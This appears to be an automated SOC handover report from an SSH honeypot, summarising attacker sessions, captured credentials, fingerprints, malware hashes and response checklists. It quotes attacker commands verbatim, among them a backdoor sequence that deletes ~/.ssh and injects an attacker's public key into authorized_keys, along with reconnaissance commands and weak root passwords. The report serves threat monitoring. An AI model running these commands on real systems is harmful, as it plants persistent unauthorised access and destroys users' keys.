# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-02 |
| **Generated At** | 2026-04-02T14:54:18Z |
| **Shift Time** | 14:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **56** |
| Confirmed Threats | **50** |
| False Positives Filtered | **6** (10.7%) |
| Unique Attacker IPs | **29** |
| Countries of Origin | **16** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **52** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **29** |
| Unique Credential Pairs | **22** |
| Unique Usernames | **17** |
| Unique Passwords | **21** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 5 |
| `GET / HTTP/1.1` | 3 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 3 |
| `Accept-Encoding: gzip` | 3 |
| `oracle` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 3 |
| `Host: 13.235.92.17:23` | 3 |
| `Accept: */*` | 3 |
| `` | 3 |
| `Password` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 3 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 3 |
| `Accept-Encoding: gzip` | `` | 3 |
| `root` | `admin` | 2 |
| `Nobody` | `Password` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin` | `176.65.148.196` | 2026-04-02T13:18:41 |
| `root` | `PA$$w0rd@12345` | `118.99.102.20` | 2026-04-02T13:38:20 |
| `root` | `3245gs5662d34` | `118.99.102.20` | 2026-04-02T13:38:24 |
| `root` | `admin` | `112.118.57.75` | 2026-04-02T14:48:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **56** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 14 |
| libssh | 9 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 14 | 14 |
| `03a80b21afa8...` | Modern SSH client | 5 | 3 |
| `a289c065bf37...` | Mirai/variant | 1 | 1 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 14 | 14 | Mirai/variant |
| `03a80b21afa8...` | libssh | 5 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `a289c065bf37...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.99.102.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **29** |
| Unique ASNs | **24** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS16135` | Turkcell A.S. | 1 | HIGH |
| `AS138423` | CMPak Limited | 1 | HIGH |
| `AS17451` | BIZNET NETWORKS | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-192e90d12103

| Field | Detail |
|---|---|
| **Source IP** | `176.65.148[.]196` |
| **First Seen** | 2026-04-02 13:18 |
| **Last Seen** | 2026-04-02 13:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 13:18:40` | `cowrie.session.connect` |
| `2026-04-02 13:18:40` | `cowrie.client.version` |
| `2026-04-02 13:18:40` | `cowrie.client.kex` |
| `2026-04-02 13:18:41` | `cowrie.login.success` |
| `2026-04-02 13:18:41` | `cowrie.direct-tcpip.request` |
| `2026-04-02 13:18:41` | `cowrie.direct-tcpip.ja4` |
| `2026-04-02 13:18:41` | `cowrie.direct-tcpip.data` |
| `2026-04-02 13:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.148[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.65.148[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64290bc50345

| Field | Detail |
|---|---|
| **Source IP** | `118.99.102[.]20` |
| **First Seen** | 2026-04-02 13:38 |
| **Last Seen** | 2026-04-02 13:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 13:38:19` | `cowrie.session.connect` |
| `2026-04-02 13:38:19` | `cowrie.client.version` |
| `2026-04-02 13:38:19` | `cowrie.client.kex` |
| `2026-04-02 13:38:20` | `cowrie.login.success` |
| `2026-04-02 13:38:20` | `cowrie.session.params` |
| `2026-04-02 13:38:20` | `cowrie.command.input` |
| `2026-04-02 13:38:20` | `cowrie.command.failed` |
| `2026-04-02 13:38:20` | `cowrie.log.closed` |
| `2026-04-02 13:38:21` | `cowrie.session.params` |
| `2026-04-02 13:38:21` | `cowrie.command.input` |
| `2026-04-02 13:38:21` | `cowrie.session.file_download` |
| `2026-04-02 13:38:21` | `cowrie.log.closed` |
| `2026-04-02 13:38:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.102[.]20` to AbuseIPDB if not already reported
- [ ] Block `118.99.102[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d44fd150445a

| Field | Detail |
|---|---|
| **Source IP** | `118.99.102[.]20` |
| **First Seen** | 2026-04-02 13:38 |
| **Last Seen** | 2026-04-02 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 13:38:23` | `cowrie.session.connect` |
| `2026-04-02 13:38:23` | `cowrie.client.version` |
| `2026-04-02 13:38:24` | `cowrie.client.kex` |
| `2026-04-02 13:38:24` | `cowrie.login.success` |
| `2026-04-02 13:38:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.99.102[.]20` to AbuseIPDB if not already reported
- [ ] Block `118.99.102[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9b6cdc9b8d6

| Field | Detail |
|---|---|
| **Source IP** | `112.118.57[.]75` |
| **First Seen** | 2026-04-02 14:48 |
| **Last Seen** | 2026-04-02 14:49 |
| **Session Duration** | 50s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 14:48:11` | `cowrie.session.connect` |
| `2026-04-02 14:48:11` | `cowrie.client.version` |
| `2026-04-02 14:48:11` | `cowrie.client.kex` |
| `2026-04-02 14:48:11` | `cowrie.login.failed` |
| `2026-04-02 14:48:12` | `cowrie.login.success` |
| `2026-04-02 14:48:13` | `cowrie.session.params` |
| `2026-04-02 14:48:13` | `cowrie.command.input` |
| `2026-04-02 14:48:13` | `cowrie.command.failed` |
| `2026-04-02 14:48:13` | `cowrie.log.closed` |
| `2026-04-02 14:48:13` | `cowrie.session.params` |
| `2026-04-02 14:48:13` | `cowrie.command.input` |
| `2026-04-02 14:48:13` | `cowrie.log.closed` |
| `2026-04-02 14:48:14` | `cowrie.session.params` |
| `2026-04-02 14:48:14` | `cowrie.command.input` |
| `2026-04-02 14:48:14` | `cowrie.log.closed` |
| `2026-04-02 14:48:14` | `cowrie.session.params` |
| `2026-04-02 14:48:14` | `cowrie.command.input` |
| `2026-04-02 14:48:14` | `cowrie.log.closed` |
| `2026-04-02 14:48:15` | `cowrie.session.params` |
| `2026-04-02 14:48:15` | `cowrie.command.input` |
| `2026-04-02 14:48:15` | `cowrie.log.closed` |
| `2026-04-02 14:48:15` | `cowrie.session.params` |
| `2026-04-02 14:48:15` | `cowrie.command.input` |
| `2026-04-02 14:48:15` | `cowrie.log.closed` |
| `2026-04-02 14:48:16` | `cowrie.session.params` |
| `2026-04-02 14:48:16` | `cowrie.command.input` |
| `2026-04-02 14:48:16` | `cowrie.log.closed` |
| `2026-04-02 14:48:16` | `cowrie.session.params` |
| `2026-04-02 14:48:16` | `cowrie.command.input` |
| `2026-04-02 14:48:16` | `cowrie.log.closed` |
| `2026-04-02 14:48:17` | `cowrie.session.params` |
| `2026-04-02 14:48:17` | `cowrie.command.input` |
| `2026-04-02 14:48:17` | `cowrie.log.closed` |
| `2026-04-02 14:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.118.57[.]75` to AbuseIPDB if not already reported
- [ ] Block `112.118.57[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.41[.]64` | **15** | 2026-04-02 14:38 | 2026-04-02 14:41 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `3.130.168[.]2` | **6** | 2026-04-02 14:01 | 2026-04-02 14:08 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `3.134.216[.]108` | **4** | 2026-04-02 14:40 | 2026-04-02 14:43 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `94.20.234[.]161` | **2** | 2026-04-02 14:03 | 2026-04-02 14:48 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.91[.]34` | 1 | 2026-04-02 13:39 | 2026-04-02 13:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.171.127[.]190` | 1 | 2026-04-02 13:58 | 2026-04-02 13:58 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.99.102[.]20` | 1 | 2026-04-02 13:38 | 2026-04-02 13:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.176.21[.]104` | 1 | 2026-04-02 13:15 | 2026-04-02 13:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `128.185.201[.]98` | 1 | 2026-04-02 13:33 | 2026-04-02 13:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.112[.]14` | 1 | 2026-04-02 13:48 | 2026-04-02 13:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]55` | 1 | 2026-04-02 13:43 | 2026-04-02 13:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `140.84.179[.]128` | 1 | 2026-04-02 14:11 | 2026-04-02 14:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-04-02 14:05 | 2026-04-02 14:05 | 30s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]196` | 1 | 2026-04-02 13:18 | 2026-04-02 13:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.75.227[.]178` | 1 | 2026-04-02 13:52 | 2026-04-02 13:52 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.59.88[.]234` | 1 | 2026-04-02 13:57 | 2026-04-02 13:57 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.228.193[.]165` | 1 | 2026-04-02 14:38 | 2026-04-02 14:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.20.26[.]201` | 1 | 2026-04-02 14:48 | 2026-04-02 14:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.82.86[.]2` | 1 | 2026-04-02 13:18 | 2026-04-02 13:18 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.169.6[.]99` | 1 | 2026-04-02 13:24 | 2026-04-02 13:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.191.181[.]23` | 1 | 2026-04-02 13:43 | 2026-04-02 13:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.30.248[.]213` | 1 | 2026-04-02 14:23 | 2026-04-02 14:23 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.35.29[.]192` | 1 | 2026-04-02 14:17 | 2026-04-02 14:17 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `20.228.193[.]165` | US | Microsoft Corporation | **100** ⚠️ | 8 |
| `83.191.181[.]23` | SE | SE TELE2 BROADBAND | **100** ⚠️ | 13 |
| `3.130.168[.]2` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `211.20.26[.]201` | TW | Data Communication Business Group, | **100** ⚠️ | 24 |
| `150.246.249[.]149` | JP | So-net Service | **100** ⚠️ | 50 |
| `223.123.41[.]64` | PK | CMPak Limited | **100** ⚠️ | 4 |
| `14.103.112[.]14` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `140.84.179[.]128` | MX | Oracle Corporation | **100** ⚠️ | 48 |
| `94.20.234[.]161` | AZ | Delta Telecom Ltd | **100** ⚠️ | 50 |
| `176.65.148[.]196` | NL | Pfcloud UG | **100** ⚠️ | 14 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 24 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 19 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 56 cases |
| Tool 34  | Credential Extractor        | ✅ 29 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 29 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (10.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 23 recon entry/entries in table (4 group(s) consolidating 27 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-02T14:54:18Z_
